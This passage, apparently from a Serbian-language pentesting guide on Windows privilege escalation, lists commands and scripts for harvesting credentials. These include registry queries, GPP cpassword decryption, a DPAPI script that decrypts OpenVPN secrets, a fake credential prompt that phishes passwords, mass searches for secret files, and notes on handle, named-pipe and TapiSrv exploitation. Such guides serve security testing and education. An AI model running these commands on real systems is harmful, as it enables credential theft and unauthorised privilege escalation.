Na Windows serveru proverite ACL konfiguracije **servera** u direktorijumu za instalaciju i svih zaštićenih rezervnih kopija. Jedna moguća lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ako se putanja razlikuje, koristite putanju konfigurisanu za uslugu. Potvrdite da trenutni identitet može da čita datoteku i da `CA.private_key` zaista postoji. Izbegavajte ispisivanje приватnog ključa u zapisnike ili izlaz enumeracije. Postupak proizvođača `config api_client` koristi ključ CA za izdavanje klijentskog sertifikata, ali potrebna je i odgovarajuća uloga na strani servera; njeno kreiranje ili menjanje može zahtevati pristup za upis u skladište podataka ili ponovno pokretanje. Postojeći privilegovani identitet servera može predstavljati put čak i kada takvi upisi nisu dostupni. API upiti sa pravima izvršavanja pokreću se u relevantnom kontekstu servera ili agenta, koji može imati visoke privilegije.

Zaštitite konfiguraciju servera i rezervne kopije restriktivnim ACL-ovima, držite ključ za potpisivanje CA van mreže kada je to moguće i ograničite API uloge i pristup listener-u. Pogledajte [Velociraptor API dokumentaciju](https://docs.velociraptor.app/docs/server_automation/server_api/) i [uputstva za bezbednosnu konfiguraciju](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban upravljač sesijama. Njegovo izvorno šifrovano skladište može se nalaziti na `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može imati naziv `sessions-backup.dat` i biti sačuvana na drugom mestu. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i da mogu sadržati sesije, ključeve, skripte, oznake i relacije; njihov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) navodi lokaciju izvornog skladišta. Najpre proverite dozvole za datoteke i putanje. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti uskladišteni unutar ključa registra `HKCU\Software\OpenSSH\Agent\Keys`, pa bi trebalo da proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo koji unos unutar te putanje, verovatno je reč o sačuvanom SSH ključu. Čuva se šifrovano, ali se može lako dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako usluga `ssh-agent` nije pokrenuta, a želite da se automatski pokreće pri pokretanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da napravim ssh ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu preko ssh-a. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije otkrio upotrebu dpapi.dll tokom autentifikacije asimetričnim ključem.

### Datoteke za unattended instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete potražiti i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive Windows Imaging (`.wim`) rezervne kopije mogu sadržati i offline `SAM`, `SECURITY` i `SYSTEM` hive-ove. Prioritet dajte lokalno dostupnim direktorijumima sa rezervnim kopijama ili image fajlovima i pre izdvajanja pregledajte **nazive članova** image fajla; samo ime `.wim` fajla ne dokazuje da su hive-ovi izloženi, a uobičajeni `install.wim`, `boot.wim` i recovery image fajlovi često su pogrešni tragovi. SMB deljenje predstavlja zaseban put pristupa i treba ga proveravati samo ako je to deljenje u opsegu provere. Pogledajte Microsoft smernice za [Windows image fajlove](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu za registry hive fajlove](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud akreditivi

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala postavljanje prilagođenih lokalnih administratorskih naloga na grupi računara pomoću Group Policy Preferences (GPP). Međutim, ovaj metod je imao ozbiljne bezbednosne propuste. Kao prvo, Group Policy Objects (GPOs), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svakom korisniku domena. Kao drugo, lozinke unutar ovih GPP-ova, šifrovane pomoću AES256 algoritma sa javno dokumentovanim podrazumevanim ključem, mogao je da dešifruje svaki autentifikovani korisnik. Ovo je predstavljalo ozbiljan rizik, jer je korisnicima moglo da omogući sticanje povišenih privilegija.

Da bi se ovaj rizik ublažio, razvijena je funkcija za skeniranje lokalno keširanih GPP datoteka koje sadrže polje „cpassword” koje nije prazno. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, čime pomaže u identifikaciji i otklanjanju ove bezbednosne ranjivosti.

Potražite ove datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Viste)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Dešifrovanje cPassword-a:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec-a za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web konfiguracija

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config datoteke sa podacima za autentifikaciju:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup arhive u IIS webroot-u

Stara ZIP rezervna kopija smeštena direktno u webroot-u koji se poslužuje može otkriti prethodne konfiguracione datoteke i ponovo upotrebljive akreditive. Proverite fizičku putanju podešenu za sajt i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je kandidat. Brz lokalni popis može izlistati nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne dokazuje da ona sadrži tajnu niti da oporavljeni akreditiv omogućava veće privilegije.

### OpenVPN akreditivi

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logovi

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite akreditive

Uvek možete da **zatražite od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako mislite da ih zna (imajte na umu da je **direktno traženje akreditiva** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koji sadrže pristupne podatke**

Poznate datoteke koje su ranije sadržale **lozinke** u **clear-text** formatu ili Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Varijanta liste naziva datoteka bez ekstenzije Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Baze podataka Password Safe v3 obično koriste ekstenziju `.psafe3`. Podudarno ime datoteke smatrajte mogućim kandidatom za šifrovani trezor; samo njegovo prisustvo ne znači da možete da ga pročitate, otključate ili koristite sačuvane akreditive. Prilikom provere gde su takve datoteke smeštene, pregledajte dostupne korisničke profile i konfigurisane korene deljenih datoteka.

Čitljiv KeePass `.kdbx` je takođe samo trag ka šifrovanom trezoru. Za njegovo otključavanje potrebni su stvarna glavna lozinka i svi konfigurisani faktori, kao što su ključna datoteka ili nalog. Ako ovlašćena provera pronađe par LM:NT hash vrednosti u unosu, proverite navedeni nalog i da li je NT hash aktuelan i prihvaćen na NTLM servisu cilja pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Unos u trezoru sam po sebi ne daje Administrator ili SYSTEM prava; moraju biti omogućeni i udaljeni pristup servisu, prava naloga i svaki zaseban korak za izvršavanje servisa. U inventaru treba navesti putanju do trezora i da li je čitljiv, a ne ispisivati bazu podataka ili sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Varijanta komande za pretragu bez ekstenzije Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Kredencijali u korpi za otpatke

Takođe proverite korpu za otpatke i potražite kredencijale

Proverite dostupne stavke korpe za otpatke da biste pronašli obrisane rezervne kopije i arhive konfiguracija, kao i datoteke čiji nazivi izričito pominju kredencijale. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara nekoliko meseci i imati uobičajen naziv. Windows čuva originalnu putanju i vreme brisanja u zapisu `$I`, a obrisanu datoteku kao odgovarajući unos `$R`; pregledajte metapodatke i proverite da li trenutni identitet ima dozvolu za čitanje pre nego što otvorite arhivu. Vidljivost zavisi od volumena, SID-a korisnika i dozvola za datoteke, pa prazan spisak ne dokazuje da ne postoji povratljiva rezervna kopija. Naziv arhive posmatrajte kao kandidat za proveru, a ne kao dokaz da ona sadrži važeću tajnu.

Dostupan obrisani `.pfx` takođe može ukazivati na mogućnost **potpisivanja koda**. Ako sadrži dostupan privatni ključ, tim ključem možete potpisati izmenjenu PowerShell skriptu; [PowerShell zahteva sertifikat za potpisivanje koda sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [pravila izdavača u AppLocker-u proveravaju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Za izvršavanje između naloga, trenutni identitet mora moći da izmeni konkretnu skriptu, na snazi mora biti pravilo koje prihvata dobijeni potpis za tu skriptu i ciljni nalog, a zadatak po rasporedu ili drugi potrošač sa višim privilegijama mora zaista da je pokrene. Sam naziv datoteke `.pfx`, predmet sertifikata ili skripta u koju je moguće upisivati ne dokazuju da je ovaj niz uslova ispunjen. Pregledajte metapodatke, ACL-ove, smernice i komandu zadatka pre otvaranja materijala sa privatnim ključem ili pokretanja zadatka.

Takođe pregledajte dostupne baze podataka profila klijenata za razmenu poruka, beleške i primljene datoteke u potrazi za tragovima o kredencijalima. Izvezena BitLocker recovery informacija može biti sačuvana kao HTML ili TXT datoteka, ponekad unutar arhive rezervne kopije sa odgovarajućim nazivom. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu podataka koji sadrži starije rezervne kopije; pregledajte volumen i arhivu samo ako imate odobrenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, za oporavak domenских kredencijala van mreže potreban je i odgovarajući `SYSTEM` hive, kao što je opisano u [radnom toku za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sam naziv datoteke i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Za **oporavak lozinki** sačuvanih u nekoliko programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registry-ja

**Drugi mogući registry ključevi sa kredencijalima**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz **Chrome-a ili Firefox-a**.\
Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz **Chrome-a, Edge-a ili Firefox-a**.\
Proverite i istoriju, obeleživače i omiljene stavke u pregledačima, jer se tamo možda čuvaju neke **lozinke**.

Za uobičajeni profil **Default** preglednika Edge trenutnog korisnika, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok se `Local State` nalazi u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); neki drugi profil ili smernica `UserDataDir` mogu da promene tu lokaciju. Prisustvo fajlova samo ukazuje na moguću lokaciju skladišta akreditiva: proverite da li su fajlovi čitljivi, da li imate odgovarajući DPAPI kontekst korisnika ili drugi ovlašćeni ključni materijal, kao i da li sačuvana prijava pripada nalogu sa višim privilegijama. Samo nabrajanje putanja ne mora da otvori bazu podataka niti da ispiše dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu upareni fajlovi sa ključem i šifrovanim prijavama. Njihovo prisustvo samo ukazuje na moguću lokaciju: proverite da li su oba fajla čitljiva, da li postoje sačuvani unosi i da li je ključ zaštićen primarnom lozinkom pre nego što zaključite da su akreditivi upotrebljivi. Ako pronađeni akreditiv pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za upravljanje grupama i [prava grupe za čitanje ili dešifrovanje LAPS lozinki](../active-directory-methodology/laps.md); artefakti pregledača sami po sebi ne potvrđuju putanju do administratorskih privilegija.

Alati za izvlačenje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta je **identifikovana pomoću ID-a klase (CLSID)**, a svaka komponenta pruža funkcionalnost putem jednog ili više interfejsa, identifikovanih pomoću ID-jeva interfejsa (IID).

COM klase i interfejsi su definisani u registru, redom pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ovaj registar nastaje spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-jeva ovog registra možete pronaći podređeni ključ registra **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL**, kao i vrednost pod nazivom **ThreadingModel**, čija vrednost može biti **Apartment** (jednonitni), **Free** (višenitni), **Both** (jednonitni ili višenitni) ili **Neutral** (nezavisan od niti).

![Istorija pregledača - COM DLL Overwriting: Unutar CLSID-jeva ovog registra možete pronaći podređeni ključ registra InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL, kao i vrednost...](<../../images/image (729).png>)

U suštini, ako možete da **prepišete bilo koji DLL** koji će se izvršiti, mogli biste da **eskalirate privilegije** ako taj DLL treba da izvrši drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za postojanost, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u fajlovima i registru**

**Pretraživanje sadržaja fajlova**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Pretraga datoteke sa određenim nazivom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Potražite nazive ključeva i lozinke u registru**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alatke koje traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da bi **automatski pokrenuo svaki Metasploit POST modul koji traži kredencijale** na žrtvi.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski traži sve datoteke koje sadrže lozinke navedene na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje lozinki iz sistema.

Alatka [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sesije**, **korisnička imena** i **lozinke** za nekoliko alatki koje čuvaju ove podatke u čistom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Zamislite da **proces koji se izvršava kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali uz nasleđivanje svih otvorenih handles glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete da preuzmete **otvoreni handle ka privilegovanom procesu** kreiran sa `OpenProcess()` i **ubacite shellcode**.\
[Pročitajte ovaj primer da biste saznali više o tome **kako da otkrijete i iskoristite ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i ovu **objavu za potpunije objašnjenje testiranja i zloupotrebe drugih otvorenih handles procesa i threads nasleđenih sa različitim nivoima dozvola (ne samo punim pristupom)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, poznati kao **pipes**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da razmenjuju podatke, čak i preko različitih mreža. Ovo podseća na arhitekturu klijent/server, sa ulogama **named pipe server** i **named pipe client**.

Kada **klijent** pošalje podatke kroz pipe, **server** koji je podesio pipe može da **preuzme identitet** **klijenta**, pod uslovom da ima potrebna prava **SeImpersonate**. Ako pronađete **privilegovani proces** koji komunicira preko pipe-a koji možete da oponašate, možete da **dobijete veće privilegije** tako što ćete preuzeti identitet tog procesa kada stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje ovakvog napada možete pronaći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava **presretanje komunikacije preko named pipe-a pomoću alata kao što je Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privesc ranjivosti** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani klijent može da zloupotrebi asinhroni put događaja zasnovan na mailslot-u i pretvori `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju `NETWORK SERVICE` može da upisuje, a zatim dobije administratorska prava za Telephony i učita proizvoljan DLL kao servis. Ceo postupak:

- Pozovite `ClientAttach` sa parametrom `pszDomainUser` podešenim na postojeću putanju u koju je moguće upisivati → servis je otvara preko `CreateFileW(..., OPEN_EXISTING)` i koristi je za asinhroni upis događaja.
- Svaki događaj upisuje napadačev `InitContext` iz `Initialize` u taj handle. Registrujte line app pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite događaj pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim poništite registraciju/isključite servis da biste ponovili determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa proizvoljnom putanjom do DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu da izvršavaju sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute-a preko Markdown renderera

Klikabilni Markdown linkovi prosleđeni funkciji `ShellExecuteExW` mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke koje kontroliše napadač kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Nadgledanje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditive u komandnoj liniji**. Skripta u nastavku beleži komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim, prikazujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
